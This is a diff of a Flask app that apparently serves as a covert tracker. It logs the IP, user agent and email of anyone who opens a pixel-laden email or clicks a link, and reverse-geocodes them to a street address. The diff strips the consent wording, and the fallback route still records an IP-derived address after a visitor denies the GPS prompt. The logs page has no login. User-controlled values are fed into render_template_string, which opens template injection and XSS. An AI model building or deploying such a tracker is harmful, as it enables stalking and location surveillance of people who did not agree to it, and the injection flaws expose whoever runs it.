@@ -1,44 +1,31 @@
 # app.py
 
 from flask import Flask, request, redirect, render_template_string, render_template, Response
+from ip_locator import get_location_from_ip 
+from opencage.geocoder import OpenCageGeocode 
+from base64 import b64decode
 import datetime
 import sqlite3 
 import os 
-from opencage.geocoder import OpenCageGeocode 
-from ip_locator import get_location_from_ip # Required for fallback/logging
 
 app = Flask(__name__)
 
 # --- Configuration ---
-# NOTE: Final destination after location is logged
 FINAL_DESTINATION_URL = "https://www.google.com/search?q=location+based+facility+provided"
 DATABASE_FILE = 'click_tracker.db'
 
-# Use environment variable for secure API key (MANDATORY for deployment)
+# Load API Key from Render Environment Variable (Secure method)
 OPENCAGE_API_KEY = os.environ.get("OPENCAGE_API_KEY", "MISSING")
 
-# Initialize the OpenCage client for Reverse Geocoding
+# Initialize the OpenCage client
 if OPENCAGE_API_KEY != "MISSING":
     geocoder = OpenCageGeocode(OPENCAGE_API_KEY)
 else:
     geocoder = None
 
-# --- Simplified Geocoding (Required for Saving Address) ---
-def get_address_from_coords(lat, lon):
-    if not geocoder:
-        return "API Key Missing"
-    try:
-        results = geocoder.reverse_geocode(lat, lon, limit=1)
-        if results and results[0]['formatted']:
-            return results[0]['formatted']
-        return "Address Not Found"
-    except Exception:
-        return "Geocoding API Error"
 
-# --- Database Setup and Logging Functions (Same as final version) ---
+# --- Database Setup and Logging Functions ---
 def init_db():
-    # ... (code for database creation with columns: lat, lon, source, etc.)
-    # For this system, the 'email' and 'source' columns are still needed for logging integrity.
     conn = sqlite3.connect(DATABASE_FILE)
     cursor = conn.cursor()
     cursor.execute("""
@@ -58,8 +45,7 @@ def init_db():
     conn.commit()
     conn.close()
 
-def log_click_data(ip, location, user_agent, source="GPS", email="USER_CONSENT"): 
-    # This logging function is simplified for the precise GPS goal
+def log_click_data(ip, location, user_agent, source="IP", email=None): 
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
     data = (timestamp, ip, location.get('country', 'N/A'), location.get('city', 'N/A'), 
@@ -74,71 +60,129 @@ def log_click_data(ip, location, user_agent, source="GPS", email="USER_CONSENT")
         """, data)
         conn.commit()
         conn.close()
-        print(f"--- LOGGED ({source}) --- GPS Data Saved.")
+        print(f"--- LOGGED ({source}) --- Email: {email} | Loc: {location.get('city', 'N/A')}")
+        
     except sqlite3.Error as e:
         print(f"SQLite error during logging: {e}")
 
+# --- Geocoding Function ---
+def get_address_from_coords(lat, lon):
+    if not geocoder:
+        return "API Key Missing (Check Render Environment Variables)"
+    try:
+        results = geocoder.reverse_geocode(lat, lon, limit=1)
+        if results and results[0]['formatted']:
+            return results[0]['formatted']
+        else:
+            return "Address Not Found via OpenCage"
+    except Exception as e:
+        print(f"OpenCage API Error: {e}")
+        return "Geocoding API Error"
 
-# --- STARTING POINT: The Link the User Clicks ---
-@app.route('/track_consent_location')
-def track_consent_location():
-    """Redirects user to the page that triggers the browser's location prompt."""
+
+# --- OPEN TRACKING ROUTE (The Pixel) ---
+@app.route('/track_open')
+def track_open():
     user_ip = request.remote_addr 
     user_agent = request.headers.get('User-Agent', 'Unknown')
+    email = request.args.get('email', 'anonymous@example.com') 
     
-    # We pass the minimal required data to the consent page
-    return redirect(f"/request_location?ip={user_ip}&ua={user_agent}")
+    location_data = get_location_from_ip(user_ip)
+    
+    if location_data and location_data.get('latitude'):
+        lat, lon = location_data['latitude'], location_data['longitude']
+        full_address = get_address_from_coords(lat, lon)
+        location_data['city'] = full_address
+        location_data['country'] = "IP_GEO_OPEN"
+    else:
+        location_data = {"country": "Unknown", "city": "Email Not Tracked", "latitude": None, "longitude": None}
+
+    log_click_data(user_ip, location_data, user_agent, source="OPEN_PIXEL", email=email)
+    
+    pixel_data = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII="
+    
+    return Response(response=b64decode(pixel_data), status=200, mimetype='image/png')
 
 
-# --- CONSENT PAGE: Triggers the "Allow" Pop-up ---
+# 0. HOME PAGE (Server Stability Check - Fixes root 404 error)
+@app.route('/')
+def home():
+    """A basic route to confirm the server is running."""
+    return "<h1>Tracker Server is Running!</h1><p>Use the /track_click route to start tracking.</p>"
+
+
+# --- CLICK TRACKING ROUTES (Includes GPS Consent Logic) ---
+
+@app.route('/track_click')
+def track_click():
+    user_ip = request.remote_addr 
+    user_agent = request.headers.get('User-Agent', 'Unknown')
+    email = request.args.get('email', 'anonymous@example.com') 
+    
+    return redirect(f"/request_location?ip={user_ip}&ua={user_agent}&email={email}")
+
 @app.route('/request_location')
 def request_location():
-    # Renders the HTML file with JavaScript that asks for location
     return render_template('request_location.html', 
                            user_ip=request.args.get('ip'), 
                            user_agent=request.args.get('ua'),
-                           # Note: The email is set to 'CONSENT_NEEDED' for simplicity
-                           email="USER_CONSENT") 
+                           email=request.args.get('email'))
 
-
-# --- GPS DATA RECEIVED (Latitude and Longitude are captured) ---
 @app.route('/location_received')
 def location_received():
-    ip, ua = request.args.get('ip'), request.args.get('ua')
+    ip, ua, email = request.args.get('ip'), request.args.get('ua'), request.args.get('email')
     lat, lon = request.args.get('lat'), request.args.get('lon')
     
-    # 1. Convert coords to readable address
     full_address = get_address_from_coords(float(lat), float(lon))
     
-    location_data = {
-        "country": "GPS_CONSENT", # New Source Type
-        "city": full_address, 
-        "latitude": float(lat), 
-        "longitude": float(lon)
-    }
-
-    # 2. Log the Precise GPS data
-    log_click_data(ip, location_data, ua, source="GPS_CONSENT")
+    location_data = {"country": "GPS_DATA", "city": full_address, "latitude": float(lat), "longitude": float(lon)}
+    log_click_data(ip, location_data, ua, source="GPS", email=email)
     
     return redirect(FINAL_DESTINATION_URL)
 
-
-# --- FALLBACK (User Denied/Failed) ---
 @app.route('/fallback')
 def fallback():
-    # Log that the user did not consent
-    log_click_data(
-        ip=request.args.get('ip'), 
-        location={"country": "DENIED", "city": "NO_GPS_CONSENT", "latitude": None, "longitude": None}, 
-        user_agent=request.args.get('ua'), 
-        source="CONSENT_DENIED"
-    )
+    ip, ua, email = request.args.get('ip'), request.args.get('ua'), request.args.get('email')
+    
+    location_data = get_location_from_ip(ip)
+    
+    if location_data and location_data.get('latitude') and location_data.get('longitude'):
+        lat, lon = location_data['latitude'], location_data['longitude']
+        full_address = get_address_from_coords(lat, lon)
+        location_data['city'] = full_address
+        location_data['country'] = "IP_GEO_LOC"
+    elif not location_data:
+        location_data = {"country": "Unknown", "city": "Unknown", "latitude": None, "longitude": None}
+
+    log_click_data(ip, location_data, ua, source="IP_FALLBACK", email=email)
+    
     return redirect(FINAL_DESTINATION_URL)
 
+# --- 5. View Logs (Admin Route - Includes trailing slash fix for routing errors) ---
+@app.route('/view_logs')
+@app.route('/view_logs/') # <-- FINAL FIX FOR ROUTING ERROR
+def view_logs():
+    if not os.path.exists(DATABASE_FILE):
+        return render_template_string("<h1>Logs</h1><p>Database file not found.</p>")
 
-# --- Admin View Logs and Main Execution (Same as final version) ---
-# NOTE: You will need the /view_logs route here to see the data.
-# NOTE: You will need the if __name__ == '__main__': block here to run the app.
+    conn = sqlite3.connect(DATABASE_FILE)
+    cursor = conn.cursor()
+    cursor.execute("SELECT id, timestamp, ip_address, country, city, latitude, longitude, source, email, user_agent FROM clicks ORDER BY timestamp DESC")
+    logs = cursor.fetchall()
+    conn.close()
 
-# ... (Insert the full view_logs function and if __name__ block from your final code here) ...
-# ... (Use the final app.py code from the last answer to ensure all necessary helper functions are present) ...
+    html = "<h1>Click Tracking Logs</h1><table border='1' style='width: 100%; word-wrap: break-word; table-layout: fixed;'><tr><th>ID</th><th>Time</th><th>IP</th><th>Country</th><th>City (Address)</th><th>Lat</th><th>Lon</th><th>Source</th><th>**Email**</th><th>User Agent</th></tr>"
+    for row in logs:
+        ua_display = row[9][:50] + '...' if len(row[9]) > 50 else row[9] 
+        html += f"<tr><td>{row[0]}</td><td>{row[1]}</td><td>{row[2]}</td><td>{row[3]}</td><td>{row[4]}</td><td>{row[5]}</td><td>{row[6]}</td><td>{row[7]}</td><td>{row[8]}</td><td>{ua_display}</td></tr>"
+    html += "</table>"
+    return render_template_string(html)
+
+
+if __name__ == '__main__':
+    init_db() 
+    if not os.path.exists('templates'):
+        os.makedirs('templates')
+    
+    print("--- Flask GPS/IP Geolocation Tracker Running ---")
+    app.run(debug=True, host='127.0.0.1', port=5000)
